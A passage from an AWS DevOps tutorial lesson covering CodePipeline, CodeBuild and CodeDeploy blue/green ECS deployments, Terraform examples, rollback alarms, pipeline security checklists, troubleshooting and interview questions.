                lifecycle_event_hook_execution_id
            ),
            status=status,
        )

    return {"status": status}
```

The hook should validate meaningful application behaviour rather than merely checking whether the load balancer returned any response.

---

# 69. Deployment configurations

For ECS and Lambda blue/green deployments, CodeDeploy supports:

```text
All at once
Canary
Linear
```

([AWS Documentation][35])

## All at once

```text
0% green
      |
      v
100% green
```

Fastest, but highest production exposure.

## Canary

```text
10% green
90% blue

Wait

100% green
```

## Linear

```text
10% green
Wait
20% green
Wait
30% green
...
100% green
```

---

# 70. Canary example

```text
CodeDeployDefault.ECSCanary10Percent5Minutes
```

Concept:

```text
First increment:
10% traffic to green

Observation:
5 minutes

Second increment:
Remaining 90%
```

CodeDeploy also supports custom ECS deployment configurations for specified canary or linear behaviour, subject to platform constraints. ([AWS Documentation][36])

---

# 71. Choosing traffic shifting

```text
Internal low-risk service:
All at once may be acceptable.

Customer-facing API:
Canary.

High-volume critical payments:
Linear or conservative canary.

Database-incompatible release:
No traffic strategy makes it safe;
fix compatibility first.
```

Traffic shifting does not replace backward-compatible database design.

---

# 72. CloudWatch alarm rollback

A CodeDeploy deployment group can monitor CloudWatch alarms.

```text
Deployment starts
      |
      v
CloudWatch alarms monitored
      |
      ├── Healthy → Continue
      └── ALARM   → Stop and roll back
```

CodeDeploy can stop a deployment when an associated alarm enters `ALARM`, and automatic rollback can redeploy the previous known-good revision. ([AWS Documentation][37])

Recommended alarms:

* ALB target 5xx rate.
* No healthy hosts.
* Target response latency.
* Application error rate.
* Custom business transaction failure.
* Queue processing failure.
* Authentication failure rate.

---

# 73. Missing alarm data

Decide what happens if CodeDeploy cannot retrieve alarm status.

Failing closed:

```text
Alarm status unavailable
    → Stop deployment
```

Failing open:

```text
Alarm status unavailable
    → Continue deployment
```

For critical production systems, failing closed is usually safer, but your operational model must prevent monitoring outages from blocking every emergency deployment indefinitely.

---

# 74. Automatic rollback

Rollback can be triggered by:

* Deployment failure.
* Alarm activation.
* Manual operator decision.
* Lifecycle-hook failure.

CodeDeploy rollback is implemented as another deployment of the previous revision rather than reversing time inside the currently failing release. ([AWS Documentation][38])

Therefore, preserve:

* Previous task definition.
* Previous image digest.
* Previous AppSpec.
* Previous configuration.
* Compatible database schema.

---

# 75. Standard ECS CodePipeline deployment

CodePipeline’s standard ECS deploy action consumes:

```text
imagedefinitions.json
```

Example:

```json
[
  {
    "name": "todo-api",
    "imageUri": "123456789012.dkr.ecr.ap-south-1.amazonaws.com/production/todo-api@sha256:ABC"
  }
]
```

The standard ECS action creates a new task-definition revision based on the revision currently used by the ECS service and substitutes the image identified in the file. ([AWS Documentation][39])

Use for:

* ECS rolling deployment.
* Simpler service release.
* Deployment circuit-breaker-based rollback.
* Services not using CodeDeploy blue/green.

---

# 76. ECS-to-CodeDeploy blue/green action

The ECS blue/green action consumes:

```text
taskdef.json
appspec.yaml
imageDetail.json
```

`imageDetail.json` contains the image URI:

```json
{
  "ImageURI": "123456789012.dkr.ecr.ap-south-1.amazonaws.com/production/todo-api@sha256:ABC"
}
```

The ECR source action can generate this file automatically, or a CodeBuild action can create it. ([AWS Documentation][40])

---

# 77. Task-definition placeholder

Example `taskdef.json`:

```json
{
  "family": "production-todo-api",
  "networkMode": "awsvpc",
  "requiresCompatibilities": [
    "FARGATE"
  ],
  "cpu": "1024",
  "memory": "2048",
  "executionRoleArn": "arn:aws:iam::123456789012:role/TodoTaskExecutionRole",
  "taskRoleArn": "arn:aws:iam::123456789012:role/TodoTaskRole",
  "containerDefinitions": [
    {
      "name": "todo-api",
      "image": "<IMAGE1_NAME>",
      "essential": true,
      "portMappings": [
        {
          "containerPort": 3002,
          "protocol": "tcp"
        }
      ]
    }
  ]
}
```

CodePipeline replaces the image placeholder with the value from the image-detail artifact before registration and deployment.

---

# 78. TodoApp pipeline architecture

```text
GitHub / CodeCommit
        |
        v
CodePipeline in Tools account
        |
        v
Source stage
        |
        v
CodeBuild test
├── npm ci
├── lint
├── unit tests
└── test reports
        |
        v
CodeBuild image build
├── Docker build
├── push candidate ECR
├── capture digest
├── generate SBOM
└── create imageDetail.json
        |
        v
Security stage
├── Inspector findings
├── signature verification
├── licence policy
└── IaC checks
        |
        v
Deploy staging account
        |
        v
Integration tests
        |
        v
Manual production approval
        |
        v
Promote same image digest
        |
        v
CodeDeploy ECS blue/green
        |
        ├── Green tasks
        ├── Test listener validation
        ├── 10% canary
        ├── CloudWatch alarms
        └── Automatic rollback
```

---

# 79. Production artifact metadata

Store a release manifest:

```json
{
  "application": "todo-api",
  "releaseVersion": "1.4.2",
  "sourceCommit": "a19f82c",
  "codeBuildId": "todo-api-build:...",
  "pipelineExecutionId": "...",
  "imageUri": "123456789012.dkr.ecr.ap-south-1.amazonaws.com/production/todo-api@sha256:ABC",
  "taskDefinition": "production-todo-api:42",
  "sbomLocation": "s3://release-evidence/todo-api/1.4.2/sbom.json",
  "approvedChange": "CHG-104"
}
```

This supports incident response and audit.

---

# 80. Terraform artifact bucket

```hcl
resource "aws_s3_bucket" "pipeline_artifacts" {
  bucket = "todoapp-pipeline-artifacts-${data.aws_caller_identity.current.account_id}"

  tags = {
    Environment = "tools"
    ManagedBy   = "Terraform"
  }
}

resource "aws_s3_bucket_public_access_block" "pipeline_artifacts" {
  bucket = aws_s3_bucket.pipeline_artifacts.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_versioning" "pipeline_artifacts" {
  bucket = aws_s3_bucket.pipeline_artifacts.id

  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "pipeline_artifacts" {
  bucket = aws_s3_bucket.pipeline_artifacts.id

  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.pipeline.arn
    }

    bucket_key_enabled = true
  }
}
```

---

# 81. Terraform CodeBuild project

```hcl
resource "aws_codebuild_project" "todo_api" {
  name         = "todo-api-build"
  service_role = aws_iam_role.codebuild.arn

  build_timeout  = 30
  queued_timeout = 60

  source {
    type      = "CODEPIPELINE"
    buildspec = "buildspec.yml"
  }

  artifacts {
    type = "CODEPIPELINE"
  }

  cache {
    type     = "S3"
    location = "${aws_s3_bucket.build_cache.bucket}/todo-api"
  }

  environment {
    compute_type = "BUILD_GENERAL1_MEDIUM"

    image = "aws/codebuild/standard:7.0"

    type = "LINUX_CONTAINER"

    privileged_mode = true

    image_pull_credentials_type = "CODEBUILD"

    environment_variable {
      name  = "AWS_REGION"
      value = "ap-south-1"
    }

    environment_variable {
      name  = "ECR_REPOSITORY"
      value = aws_ecr_repository.candidate.name
    }
  }

  logs_config {
    cloudwatch_logs {
      group_name  = aws_cloudwatch_log_group.codebuild.name
      stream_name = "todo-api"
    }
  }

  tags = {
    Application = "TodoApp"
    Environment = "tools"
  }
}
```

Keep `privileged_mode = true` only because this project builds a Docker image.

---

# 82. Terraform CodeDeploy application

```hcl
resource "aws_codedeploy_app" "todo_api" {
  name             = "production-todo-api"
  compute_platform = "ECS"

  tags = {
    Application = "TodoApp"
    Environment = "production"
  }
}
```

---

# 83. Terraform CodeDeploy deployment group

```hcl
resource "aws_codedeploy_deployment_group" "todo_api" {
  app_name               = aws_codedeploy_app.todo_api.name
  deployment_group_name  = "production"
  service_role_arn       = aws_iam_role.codedeploy.arn
  deployment_config_name = "CodeDeployDefault.ECSCanary10Percent5Minutes"

  auto_rollback_configuration {
    enabled = true

    events = [
      "DEPLOYMENT_FAILURE",
      "DEPLOYMENT_STOP_ON_ALARM",
      "DEPLOYMENT_STOP_ON_REQUEST"
    ]
  }

  alarm_configuration {
    enabled = true

    alarms = [
      aws_cloudwatch_metric_alarm.alb_5xx.alarm_name,
      aws_cloudwatch_metric_alarm.unhealthy_hosts.alarm_name
    ]
  }

  blue_green_deployment_config {
    deployment_ready_option {
      action_on_timeout    = "STOP_DEPLOYMENT"
      wait_time_in_minutes = 30
    }

    terminate_blue_instances_on_deployment_success {
      action                           = "TERMINATE"
      termination_wait_time_in_minutes = 10
    }
  }

  ecs_service {
    cluster_name = aws_ecs_cluster.production.name
    service_name = aws_ecs_service.todo_api.name
  }

  load_balancer_info {
    target_group_pair_info {
      prod_traffic_route {
        listener_arns = [
          aws_lb_listener.production.arn
        ]
      }

      test_traffic_route {
        listener_arns = [
          aws_lb_listener.test.arn
        ]
      }

      target_group {
        name = aws_lb_target_group.blue.name
      }

      target_group {
        name = aws_lb_target_group.green.name
      }
    }
  }
}
```

---

# 84. Terraform CodePipeline role

```hcl
resource "aws_iam_role" "codepipeline" {
  name = "todoapp-codepipeline"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"

    Statement = [{
      Effect = "Allow"

      Principal = {
        Service = "codepipeline.amazonaws.com"
      }

      Action = "sts:AssumeRole"
    }]
  })
}
```

The attached policy should permit only:

* Artifact-bucket operations.
* KMS encrypt/decrypt.
* Starting approved CodeBuild projects.
* Invoking approved deploy actions.
* Assuming designated environment roles.
* Publishing approval notifications.

---

# 85. Terraform CodePipeline skeleton

```hcl
resource "aws_codepipeline" "todo_api" {
  name          = "todo-api"
  role_arn      = aws_iam_role.codepipeline.arn
  pipeline_type = "V2"
  execution_mode = "QUEUED"

  artifact_store {
    location = aws_s3_bucket.pipeline_artifacts.bucket
    type     = "S3"

    encryption_key {
      id   = aws_kms_key.pipeline.arn
      type = "KMS"
    }
  }

  stage {
    name = "Source"

    action {
      name             = "ApplicationSource"
      category         = "Source"
      owner            = "AWS"
      provider         = "CodeStarSourceConnection"
      version          = "1"
      output_artifacts = ["SourceArtifact"]
      namespace        = "SourceVariables"

      configuration = {
        ConnectionArn    = var.codeconnection_arn
        FullRepositoryId = "organisation/todo-api"
        BranchName       = "main"
      }
    }
  }

  stage {
    name = "Build"

    action {
      name             = "BuildAndPublish"
      category         = "Build"
      owner            = "AWS"
      provider         = "CodeBuild"
      version          = "1"
      input_artifacts  = ["SourceArtifact"]
      output_artifacts = ["BuildArtifact"]
      namespace        = "BuildVariables"

      configuration = {
        ProjectName = aws_codebuild_project.todo_api.name
      }
    }
  }

  stage {
    name = "ProductionApproval"

    action {
      name     = "ApproveProduction"
      category = "Approval"
      owner    = "AWS"
      provider = "Manual"
      version  = "1"

      configuration = {
        NotificationArn = aws_sns_topic.approvals.arn

        CustomData = (
          "Review staging evidence, image digest and rollback plan."
        )
      }
    }
  }

  stage {
    name = "Production"

    action {
      name            = "DeployBlueGreen"
      category        = "Deploy"
      owner           = "AWS"
      provider        = "CodeDeployToECS"
      version         = "1"
      input_artifacts = ["BuildArtifact"]

      configuration = {
        ApplicationName                = aws_codedeploy_app.todo_api.name
        DeploymentGroupName            = aws_codedeploy_deployment_group.todo_api.deployment_group_name
        TaskDefinitionTemplateArtifact = "BuildArtifact"
        TaskDefinitionTemplatePath     = "taskdef.json"
        AppSpecTemplateArtifact        = "BuildArtifact"
        AppSpecTemplatePath            = "appspec.yaml"
        Image1ArtifactName              = "BuildArtifact"
        Image1ContainerName             = "IMAGE1_NAME"
      }
    }
  }

  tags = {
    Application = "TodoApp"
    Environment = "tools"
  }
}
```

---

# 86. Pipeline observability

Monitor:

```text
Pipeline execution status
Stage execution status
Action execution status
Build duration
Build queue duration
Build failures
Approval duration
Deployment duration
Deployment failure
Rollback status
```

Use EventBridge to react to state changes:

```text
CodePipeline failure
      |
      v
EventBridge
      |
      ├── SNS
      ├── Slack integration
      ├── Incident system
      └── OpsCenter
```

CodePipeline, CodeBuild and CodeDeploy all expose execution state through their APIs, CloudWatch/EventBridge integrations and service logs.

---

# 87. Recommended delivery notifications

## Informational

* Pipeline started.
* Staging deployed.
* Approval requested.
* Production deployment complete.

## Actionable

* Build failed.
* Security gate blocked release.
* Approval timeout approaching.
* Production alarm triggered.
* Deployment rolled back.
* Artifact verification failed.

Avoid sending every low-level successful action to the same operational alert channel.

---

# 88. CloudTrail auditing

Use CloudTrail to audit operations such as:

```text
StartPipelineExecution
PutApprovalResult
UpdatePipeline
StartBuild
StopBuild
CreateDeployment
StopDeployment
UpdateDeploymentGroup
```

Pay special attention to:

* Manual pipeline starts.
* Approval decisions.
* Pipeline definition changes.
* Service-role changes.
* KMS-key changes.
* Rollback overrides.
* Disabled stage transitions.

---

# 89. Pipeline security controls

```text
[ ] Source branches and release tags are protected
[ ] CodeConnections are restricted
[ ] Pull-request builds have low privilege
[ ] Build roles are least privilege
[ ] Production secrets are absent from PR builds
[ ] Privileged mode is limited to container-build projects
[ ] Artifact buckets block public access
[ ] Artifacts use KMS encryption
[ ] Production deployment is cross-account
[ ] Deployment roles are environment specific
[ ] iam:PassRole is resource scoped
[ ] Approvers cannot edit the pipeline
[ ] Production artifacts use immutable digests
[ ] Security findings are enforced, not merely displayed
[ ] CloudTrail is enabled
[ ] Pipeline changes require code review
```

---

# 90. `iam:PassRole` danger

CodePipeline or CodeDeploy may need to pass roles such as:

* ECS task role.
* ECS execution role.
* CloudFormation execution role.
* CodeDeploy service role.

Bad:

```json
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "*"
}
```

Better:

```json
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": [
    "arn:aws:iam::222222222222:role/TodoAppTaskRole",
    "arn:aws:iam::222222222222:role/TodoAppTaskExecutionRole"
  ],
  "Condition": {
    "StringEquals": {
      "iam:PassedToService": "ecs-tasks.amazonaws.com"
    }
  }
}
```

Broad `iam:PassRole` can let a pipeline indirectly obtain privileges far beyond its intended deployment function.

---

# 91. Supply-chain controls

Before production deployment, verify:

```text
Source commit is reviewed
      |
      v
Build environment is trusted
      |
      v
Tests passed
      |
      v
Image digest recorded
      |
      v
SBOM generated
      |
      v
Vulnerability policy passed
      |
      v
Image signature valid
      |
      v
Production role approved
```

A pipeline that builds successfully is not automatically secure.

---

# 92. Secrets in CI/CD

Use:

* Secrets Manager.
* Parameter Store.
* CodeConnections.
* Temporary assumed roles.
* OIDC federation where supported.
* KMS-encrypted artifacts.

Do not use:

* Static AWS access keys in Git.
* Secrets in `buildspec.yml`.
* Secrets in Terraform state where avoidable.
* Tokens embedded in repository URLs.
* Docker credentials in logs.
* Plaintext approval messages.

Security Hub includes controls for plaintext CodeBuild credentials and unencrypted logs and reports. ([AWS Documentation][41])

---

# 93. Deployment windows

Production release can be controlled through:

```text
CodePipeline stage condition
Systems Manager Change Calendar
Manual approval
Organisational change-management system
```

Example:

```text
Allowed:
Saturday 22:00–Sunday 02:00 Asia/Kolkata

Blocked:
Peak sale periods
Month-end closing
Known vendor maintenance
```

Emergency release should use a separately audited break-glass process rather than silently bypassing every pipeline condition.

---

# 94. Database migrations in pipelines

Do not run an irreversible database migration blindly as part of application startup.

Safer flow:

```text
1. Backup or confirm PITR.

2. Run backward-compatible expand migration.

3. Validate migration.

4. Deploy new application.

5. Backfill data.

6. Monitor old and new versions.

7. Contract old schema in a later release.
```

Migration job should be:

* Versioned.
* Idempotent where possible.
* Independently observable.
* Time bounded.
* Protected against concurrent execution.
* Tested against realistic data volumes.

---

# 95. Avoid rebuilding during deployment

Bad:

```text
Production deployment stage:
docker build .
```

Better:

```text
Build stage:
Creates sha256:ABC

Staging:
Deploys sha256:ABC

Production:
Deploys sha256:ABC
```

Rebuilding in production breaks artifact integrity and can introduce different dependencies or base layers.

---

# 96. Cost considerations

## CodeBuild costs

Driven by:

* Compute type.
* Build duration.
* Concurrent builds.
* Reserved-fleet capacity.
* Cache storage and transfer.
* CloudWatch Logs.
* Test-report storage.
* NAT data processing.

## CodePipeline costs

Driven by:

* Pipeline type.
* Executions and actions according to the current pricing model.
* Cross-Region artifact storage and transfer.
* Supporting services.

## CodeDeploy costs

CodeDeploy service charges depend on the deployment platform and scenario, while surrounding resources such as Lambda hooks, load balancers, parallel ECS task sets, logs and alarms add cost.

Optimise cost only after preserving release safety.

---

# 97. Troubleshooting CodeBuild: build cannot pull source

Check:

```text
Source connection status
Repository permissions
Branch name
Connection installation access
VPC internet or endpoint connectivity
Self-signed certificate configuration
Service role
Webhook event
```

CodeBuild troubleshooting includes Git clone, SSL certificate and source-provider status failures. ([AWS Documentation][42])

---

# 98. Troubleshooting CodeBuild: Docker daemon unavailable

Error:

```text
Cannot connect to the Docker daemon
```

Check:

* Privileged mode.
* Linux container environment.
* Docker support in build image.
* Custom Docker-in-Docker configuration.
* Docker daemon startup.
* Local Docker-layer cache configuration.

CodeBuild documentation requires privileged mode for common Docker-in-Docker and Docker-layer-cache workflows. ([AWS Documentation][42])

---

# 99. Troubleshooting CodeBuild: out of memory

Symptoms:

```text
Build container found dead
Exit code 137
Build suddenly terminates
```

Check:

* CodeBuild compute size.
* Docker build memory.
* Parallel test count.
* Node.js heap settings.
* Large dependency installation.
* Multiarchitecture build concurrency.
* Disk and memory usage.
* Custom build image compatibility.

Move to a larger compute type only after checking whether the build itself has a memory leak or unnecessary parallelism.

---

# 100. Troubleshooting CodeBuild: cannot reach private dependency

Check:

```text
VPC configured on project
Private subnet selected
Security group egress
Destination security-group ingress
Route table
DNS
NAT gateway
VPC endpoint
CodeBuild ENI permissions
```

A project can be created successfully while its build still cannot reach required resources because the runtime network path is incomplete. ([AWS Documentation][43])

---

# 101. Troubleshooting CodeBuild: secret retrieval fails

Check:

* Correct secret or parameter ARN.
* CodeBuild service-role permission.
* KMS decrypt permission.
* Secret resource policy.
* Correct Region.
* VPC endpoint or NAT path.
* Parameter type.
* Environment-variable naming.
* Secret key selection.

Do not copy the secret into a plaintext project variable as a quick production fix.

---

# 102. Troubleshooting CodePipeline: pipeline did not start

Check:

```text
Trigger event type
Branch filter
Tag filter
File-path filter
Pull-request event
CodeConnection status
Pipeline trigger configuration
EventBridge rule
Source revision
Pipeline transition status
```

A newly created branch can have special behaviour with file-path filters because the connection may not yet have a changed-file comparison to evaluate. ([AWS Documentation][44])

---

# 103. Troubleshooting CodePipeline: artifact not found

Check:

* Output artifact name.
* Input artifact name.
* Buildspec artifact definition.
* Secondary artifact identifier.
* File path.
* Artifact store access.
* KMS permissions.
* Cross-account bucket policy.
* Cross-Region artifact store.
* ZIP structure.

Remember:

```text
CodePipeline artifact name
≠
filename inside artifact
```

---

# 104. Troubleshooting CodePipeline: variable unresolved

Example:

```text
#{BuildVariables.IMAGE_DIGEST}
```

Check:

* Build action has a namespace.
* Variable is included under `exported-variables`.
* Build reached the point where it was assigned.
* Variable name case matches.
* Later action supports variable substitution.
* Variable is not a reserved name.
* Total output-variable limits are not exceeded.

---

# 105. Troubleshooting approval did not notify

Check:

* SNS topic ARN.
* Topic Region.
* CodePipeline role can publish.
* Subscription is confirmed.
* Subscription filter policy.
* Endpoint delivery status.
* Approval action reached.
* Approval timeout.

The pipeline can still be waiting for approval even when the notification delivery failed.

---

# 106. Troubleshooting cross-account deployment

Check:

```text
Pipeline role can assume target role
Target trust policy allows exact pipeline role
Artifact bucket allows target role
KMS key allows target role
Target role has deploy permissions
iam:PassRole is allowed
Resource Region matches
Action role ARN is configured
```

A common error is granting S3 access but forgetting KMS decryption.

---

# 107. Troubleshooting CodeDeploy ECS deployment

Check:

* ECS service uses expected deployment controller.
* CodeDeploy service role.
* Two target groups.
* Listener rules.
* Correct container name.
* Correct container port.
* Replacement task definition.
* Subnets and security groups.
* AppSpec syntax.
* Image placeholder mapping.
* ECR pull permission.
* Fargate capacity.
* Health checks.

CodeDeploy’s ECS troubleshooting guidance recommends inspecting lifecycle events and load-balancer health while the replacement task set is being created. ([AWS Documentation][45])

---

# 108. Green tasks do not become healthy

Check:

```text
Container starts
Image architecture
Environment variables
Secret retrieval
Application listens on 0.0.0.0
Correct port
Task security group
Target-group health path
Database access
Health-check grace period
Task CPU and memory
```

Inspect:

```bash
aws ecs describe-services \
  --cluster production \
  --services todo-api \
  --region ap-south-1

aws ecs describe-tasks \
  --cluster production \
  --tasks TASK_ARN \
  --region ap-south-1

aws elbv2 describe-target-health \
  --target-group-arn TARGET_GROUP_ARN \
  --region ap-south-1
```

---

# 109. Lifecycle hook times out

Check:

* Hook Lambda was invoked.
* Lambda has permission to call `PutLifecycleEventHookExecutionStatus`.
* Deployment ID and hook execution ID are preserved.
* Function returned `Succeeded` or `Failed`.
* Test URL is reachable.
* Test listener is configured.
* Lambda VPC networking.
* Lambda timeout.
* CloudWatch logs.

A hook that finishes its own code without reporting the status to CodeDeploy can leave the deployment waiting until timeout.

---

# 110. Alarm triggers immediately

Check:

* Alarm was already in `ALARM` before deployment.
* Alarm has insufficient-data behaviour.
* Dimensions match new and old target groups.
* Alarm threshold is realistic.
* Traffic volume is sufficient for the metric.
* Canary percentage is too low for reliable statistics.
* Alarm evaluates old traffic instead of green traffic.
* Missing data is treated as breaching.

Test deployment alarms before depending on automatic rollback.

---

# 111. Rollback fails

Possible causes:

* Previous image was deleted.
* Previous task-definition revision was deregistered or invalid.
* Database migration is incompatible.
* Previous secret or parameter no longer exists.
* Previous container cannot run with current infrastructure.
* Target-group configuration changed.
* Pipeline structure changed.
* Previous artifact is inaccessible.
* KMS key permission changed.

Rollback capability must be tested as a complete system—not inferred merely because a rollback checkbox is enabled.

---

# 112. Production CI/CD checklist

```text
[ ] Source branches are protected
[ ] Release tags are protected
[ ] Pull-request builds are isolated
[ ] Pipeline definition is stored as code
[ ] Buildspec is stored with source
[ ] Build uses strict shell handling
[ ] Builds are reproducible
[ ] Dependency lock files are committed
[ ] Production artifact is built once
[ ] Image digest is recorded
[ ] Artifacts are signed
[ ] SBOM is generated
[ ] Vulnerability findings are enforced
[ ] CodeBuild role is least privilege
[ ] Privileged mode is restricted
[ ] Secrets use Secrets Manager or Parameter Store
[ ] Logs exclude secrets
[ ] Artifact bucket is private
[ ] Artifact bucket is KMS encrypted
[ ] KMS key policy supports action roles
[ ] VPC builds have NAT or endpoints
[ ] Test reports are retained
[ ] Pipeline execution mode is intentional
[ ] Trigger filters are tested
[ ] Pipeline stages expose major gates
[ ] Manual approval contains evidence
[ ] Approvers cannot edit the pipeline
[ ] Cross-account roles are environment specific
[ ] Production deployment uses temporary role sessions
[ ] iam:PassRole is restricted
[ ] Deployment uses immutable artifact digest
[ ] Database changes are backward compatible
[ ] Deployment validation is automatic
[ ] CloudWatch alarms represent customer health
[ ] Automatic rollback is enabled
[ ] Previous artifacts remain available
[ ] Deployment state changes generate alerts
[ ] CloudTrail audits approval and pipeline changes
[ ] Recovery and rollback are tested
```

---

# 113. Certification-focused understanding

## AWS Cloud Practitioner

Understand:

```text
CodeBuild:
Managed build and test service.

CodePipeline:
CI/CD workflow orchestration.

CodeDeploy:
Application deployment automation.
```

## Solutions Architect Associate

Understand:

```text
Build projects
Buildspec files
Artifact buckets
CodePipeline stages and actions
Manual approvals
CodeDeploy in-place and blue/green
ECS task definitions
Cross-account deployment roles
```

## DevOps Engineer Professional

Understand:

```text
Pipeline V1 versus V2
Execution modes
Git trigger filters
Stage conditions
Automatic stage rollback
CodeBuild batch builds
VPC builds
Artifact encryption
Cross-Region artifact stores
Cross-account KMS
CodeDeploy lifecycle hooks
Canary and linear deployment
Alarm-based rollback
Immutable artifact promotion
```

---

# 114. Interview questions

## Question 1: What is AWS CodeBuild?

**Answer:**

CodeBuild is a managed build service that runs configured commands inside temporary build environments to compile, test, scan and package software.

## Question 2: What is a buildspec file?

**Answer:**

It is a YAML file defining CodeBuild phases, commands, variables, reports, artifacts and cache configuration.

## Question 3: What is the CodeBuild service role?

**Answer:**

It is the IAM role assumed by CodeBuild to access resources such as source artifacts, ECR, S3, Secrets Manager and CloudWatch Logs.

## Question 4: When does CodeBuild need privileged mode?

**Answer:**

It is commonly required for Docker-in-Docker image builds and Docker layer caching. It should remain disabled for projects that do not require elevated container access.

## Question 5: What is the difference between local and S3 build cache?

**Answer:**

Local cache stays on a particular build host and can cache source, Docker layers or custom paths. S3 cache can be reused across build hosts and projects.

## Question 6: What is AWS CodePipeline?

**Answer:**

It is a managed CI/CD orchestration service that moves revisions and artifacts through stages and actions.

## Question 7: What is the difference between a stage and an action?

**Answer:**

A stage represents a lifecycle phase, while an action performs one task inside that stage.

## Question 8: What are CodePipeline execution modes?

**Answer:**

`SUPERSEDED` prioritises newer executions, `QUEUED` processes executions in order, and `PARALLEL` permits independent executions to run simultaneously.

## Question 9: What is the difference between CodePipeline V1 and V2?

**Answer:**

V2 supports additional capabilities including advanced Git triggers, pipeline variables, queued and parallel execution modes, and added release-safety features.

## Question 10: Where are CodePipeline artifacts stored?

**Answer:**

They are stored in an Amazon S3 artifact bucket, normally encrypted using an AWS-managed or customer-managed KMS key.

## Question 11: Why is a customer-managed KMS key important for cross-account pipelines?

**Answer:**

It allows explicit KMS-key permissions to be granted to roles in target accounts that must decrypt pipeline artifacts.

## Question 12: What is a manual approval action?

**Answer:**

It pauses a pipeline until an authorised person approves or rejects the release.

## Question 13: What are stage conditions?

**Answer:**

They are rule-based checks that can control stage entry, handle failure, validate success or trigger rollback.

## Question 14: What is CodeDeploy?

**Answer:**

It is a managed deployment service for EC2/on-premises, Lambda and ECS application deployments.

## Question 15: What is an AppSpec file?

**Answer:**

It defines deployment-specific resources and lifecycle hooks used by CodeDeploy.

## Question 16: What is ECS blue/green deployment?

**Answer:**

It creates a replacement task set, validates it and shifts traffic from the original task set to the replacement through separate target groups.

## Question 17: What are CodeDeploy lifecycle hooks?

**Answer:**

They are deployment phases where Lambda functions can perform validation before or after installation, test traffic and production traffic shifting.

## Question 18: How does CodeDeploy automatic rollback work?

**Answer:**

When configured deployment failures or CloudWatch alarms occur, CodeDeploy launches a new deployment using the previous known-good revision.

## Question 19: What is build once, promote many?

**Answer:**

It means creating one immutable artifact and deploying that exact artifact through testing, staging and production without rebuilding it.

## Question 20: How do you secure a production pipeline?

**Answer:**

Use protected source branches, least-privilege roles, temporary credentials, KMS-encrypted artifacts, isolated accounts, immutable signed artifacts, security gates, controlled approvals, gradual deployment, alarms and automatic rollback.

---

# 115. Never-forget revision

```text
CodeBuild:
Builds and tests software.

Build project:
Reusable build configuration.

Build execution:
One project run.

Buildspec:
Version-controlled build instructions.

Service role:
Build-time AWS permissions.

Privileged mode:
Elevated mode commonly required for Docker builds.

Cache:
Speeds builds but is not a release artifact.

Report group:
Stores test or coverage results.

CodePipeline:
Orchestrates release stages.

Stage:
Logical pipeline phase.

Action:
One task inside a stage.

Artifact:
File bundle passed between actions.

Variable:
Dynamic pipeline value.

Trigger:
Event starting a pipeline.

V2 pipeline:
Advanced triggers, variables and execution modes.

SUPERSEDED:
Newer execution replaces older relevance.

QUEUED:
Every execution waits its turn.

PARALLEL:
Independent executions run together.

Manual approval:
Human release decision.

Stage condition:
Rule controlling entry, success, failure or rollback.

CodeDeploy:
Application deployment automation.

Deployment group:
Deployment targets and policies.

AppSpec:
Deployment resource and hook definition.

Canary:
Small traffic shift followed by full traffic.

Linear:
Traffic shifts through repeated increments.

Blue/green:
Old and new environments coexist.

Lifecycle hook:
Automated deployment validation point.

Automatic rollback:
Redeploys prior known-good revision.
```

## One-line memory trick

```text
Build once.
Test completely.
Encrypt every artifact.
Promote the same digest.
Approve with evidence.
Shift traffic gradually.
Watch real health.
Roll back automatically.
```

## Lesson 46 outcome

You can now design a pipeline where:

```text
A developer pushes code
    → CodePipeline starts from a controlled trigger.

The revision needs testing
    → CodeBuild runs lint, unit tests and reports.

A container must be produced
    → CodeBuild creates one immutable ECR digest.

The artifact needs security validation
    → Scans, SBOMs and signatures become release gates.

Staging must use the production candidate
    → The same digest is deployed without rebuilding.

Production requires approval
    → An authorised approver reviews evidence.

A new ECS revision needs safe exposure
    → CodeDeploy creates the green task set.

Green needs validation
    → Lifecycle hooks use the test listener.

Only a small audience should see it first
    → Canary traffic shifts gradually.

Errors increase
    → CloudWatch alarms stop and roll back the deployment.

Accounts must remain isolated
    → CodePipeline assumes narrow deployment roles.
```

**Next lesson: Lesson 47 — Amazon RDS and Amazon Aurora production architecture: engines, Multi-AZ, read replicas, backups, failover, RDS Proxy, connection management, parameter groups, encryption, monitoring, migration and disaster recovery.**

[1]: https://docs.aws.amazon.com/codebuild/latest/userguide/concepts.html?utm_source=chatgpt.com "AWS CodeBuild concepts - AWS CodeBuild"
[2]: https://docs.aws.amazon.com/codebuild/latest/userguide/build-env-ref-compute-types.html?utm_source=chatgpt.com "Build environment compute modes and types - AWS CodeBuild"
[3]: https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html?utm_source=chatgpt.com "Build specification reference for CodeBuild - AWS CodeBuild"
[4]: https://docs.aws.amazon.com/codebuild/latest/userguide/change-project.html?utm_source=chatgpt.com "Change build project settings in AWS CodeBuild"
[5]: https://docs.aws.amazon.com/codebuild/latest/userguide/setting-up-service-role.html?utm_source=chatgpt.com "Allow CodeBuild to interact with other AWS services"
[6]: https://docs.aws.amazon.com/securityhub/latest/userguide/codebuild-controls.html?utm_source=chatgpt.com "Security Hub CSPM controls for CodeBuild"
[7]: https://docs.aws.amazon.com/codebuild/latest/userguide/public-builds.html?utm_source=chatgpt.com "Get public build project URLs - AWS CodeBuild"
[8]: https://docs.aws.amazon.com/codebuild/latest/userguide/lambda.html?utm_source=chatgpt.com "Run builds on AWS Lambda compute - AWS CodeBuild"
[9]: https://docs.aws.amazon.com/codebuild/latest/userguide/fleets.html?utm_source=chatgpt.com "Run builds on reserved capacity fleets - AWS CodeBuild"
[10]: https://docs.aws.amazon.com/codebuild/latest/userguide/vpc-support.html?utm_source=chatgpt.com "Use AWS CodeBuild with Amazon Virtual Private Cloud - AWS CodeBuild"
[11]: https://docs.aws.amazon.com/codebuild/latest/userguide/caching-s3.html?utm_source=chatgpt.com "Amazon S3 caching - AWS CodeBuild"
[12]: https://docs.aws.amazon.com/codebuild/latest/userguide/test-reporting.html?utm_source=chatgpt.com "Test reports in AWS CodeBuild - AWS CodeBuild"
